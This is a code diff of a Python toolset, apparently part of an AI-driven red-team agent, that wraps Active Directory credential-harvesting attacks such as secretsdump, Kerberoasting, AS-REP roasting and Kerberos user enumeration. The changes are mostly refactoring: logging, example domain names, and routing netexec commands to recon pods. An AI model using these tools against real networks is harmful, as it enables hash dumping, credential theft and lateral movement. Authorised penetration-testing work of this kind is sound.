@@ -8,7 +8,6 @@ This module provides tools for harvesting credentials via AD attacks:
 """
 
 import asyncio
-import logging
 import re
 import shlex
 import uuid
@@ -16,19 +15,19 @@ from typing import Any, ClassVar
 
 import dreadnode as dn
 from dreadnode.agent.tools.base import Toolset
+from loguru import logger
 
-from ares.core.models import Hash, User
+from ares.core.models import Hash
 from ares.core.remote import run_remote
 from ares.tools.red.common import (
     PLACEHOLDER_PASSWORDS,
     AnyRedTeamState,
+    add_user_to_state,
     is_ntlm_hash,
     resolve_password,
     run_tool,
     write_users_file_remote,
 )
-
-logger = logging.getLogger(__name__)
 
 
 class CredentialHarvestingTools(Toolset):
@@ -211,8 +210,8 @@ class CredentialHarvestingTools(Toolset):
         Example:
             >>> secretsdump("192.168.58.100", "admin", password="pass")  # pragma: allowlist secret
             >>> secretsdump("192.168.58.100", "admin", hash="aad3b4...")
-            >>> secretsdump("dc01.domain.local", "Administrator", no_pass=True)
-            >>> secretsdump("dc01.domain.local", "Administrator", no_pass=True, ticket_path="admin.ccache")
+            >>> secretsdump("dc01.contoso.local", "Administrator", no_pass=True)
+            >>> secretsdump("dc01.contoso.local", "Administrator", no_pass=True, ticket_path="admin.ccache")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if hash and not is_ntlm_hash(hash):
@@ -326,7 +325,7 @@ class CredentialHarvestingTools(Toolset):
         obtain service account passwords, which often have elevated privileges.
 
         Args:
-            domain: Target domain (e.g., 'example.local')
+            domain: Target domain (e.g., 'contoso.local')
             username: Valid domain username
             password: Password for the username
             dc_ip: Domain controller IP address
@@ -335,7 +334,7 @@ class CredentialHarvestingTools(Toolset):
             Kerberos TGS hashes for service accounts that can be cracked offline
 
         Example:
-            >>> kerberoast("example.local", "user", "pass", "192.168.58.100")
+            >>> kerberoast("contoso.local", "user", "pass", "192.168.58.100")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -397,7 +396,7 @@ class CredentialHarvestingTools(Toolset):
         valid principals even when SMB/LDAP recon is blocked.
 
         Args:
-            domain: Target domain (e.g., 'example.local')
+            domain: Target domain (e.g., 'contoso.local')
             dc_ip: Domain controller IP address
             users_file: Path to usernames file (optional)
 
@@ -476,26 +475,15 @@ class CredentialHarvestingTools(Toolset):
                         validated.add(match.group(1))
 
             if validated and self.state:
-                existing = {user.username.lower() for user in self.state.users}
                 for username in sorted(validated):
-                    if username.lower() in existing:
-                        continue
-                    self.state.users.append(
-                        User(
-                            username=username,
-                            domain=domain,
-                            description="validated via Kerberos (no-auth)",
-                        )
-                    )
-                    logger.info(f"[+] Recorded user from Kerberos no-auth: {username}@{domain}")
+                    if add_user_to_state(self.state, username, domain, source="kerberos_noauth"):
+                        logger.info(f"[+] Recorded user from Kerberos no-auth: {username}@{domain}")
 
             if validated:
                 summary = ", ".join(sorted(validated))
                 users_file = f"/tmp/users_kerberos_{uuid.uuid4().hex}.txt"  # nosec B108  # noqa: S108
-                # Write to recon pod where netexec commands execute
-                ok, error = write_users_file_remote(
-                    sorted(validated), users_file, target_role="recon"
-                )
+                # Write users file locally for Kerberos validation
+                ok, error = write_users_file_remote(sorted(validated), users_file, target_role=None)
                 if ok:
                     file_note = f"\nUsers file: {users_file}"
                 else:
@@ -554,7 +542,7 @@ class CredentialHarvestingTools(Toolset):
         cracked offline to obtain user passwords.
 
         Args:
-            domain: Target domain (e.g., 'example.local')
+            domain: Target domain (e.g., 'contoso.local')
             username: Valid domain username (for recon)
             password: Password for the username
             dc_ip: Domain controller IP address
@@ -563,7 +551,7 @@ class CredentialHarvestingTools(Toolset):
             AS-REP hashes for vulnerable user accounts
 
         Example:
-            >>> asrep_roast("example.local", "user", "pass", "192.168.58.100")
+            >>> asrep_roast("contoso.local", "user", "pass", "192.168.58.100")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -682,7 +670,8 @@ class CredentialHarvestingTools(Toolset):
 
             cmd.extend(["-x", "whoami"])
 
-            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+            # netexec is only installed on RECON pods - route there
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120, target_role="recon")
 
             output = stdout
             if stderr:
